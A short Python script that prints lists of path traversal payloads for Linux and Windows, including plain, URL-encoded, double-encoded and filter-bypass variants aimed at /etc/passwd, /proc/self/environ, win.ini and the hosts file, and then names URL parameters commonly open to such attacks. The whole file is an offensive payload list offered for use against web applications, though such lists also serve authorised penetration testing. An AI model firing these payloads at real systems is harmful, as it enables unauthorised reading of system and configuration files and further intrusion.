#!/usr/bin/env python3
import sys

def main():
    os_type = "linux"
    if len(sys.argv) > 1:
        os_type = sys.argv[1].lower()

    linux_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "/proc/self/environ"
    ]

    windows_payloads = [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "..%5c..%5c..%5cwindows%5cwin.ini"
    ]

    print(f"--- File Path Traversal Payloads ({os_type.capitalize()}) ---\n")
    
    payloads = linux_payloads if os_type == "linux" else windows_payloads
    for p in payloads:
        print(p)

    print("\nCommon Vulnerable Parameters:")
    print("?file=, ?path=, ?page=, ?template=, ?filename=, ?doc=")

if __name__ == "__main__":
    main()
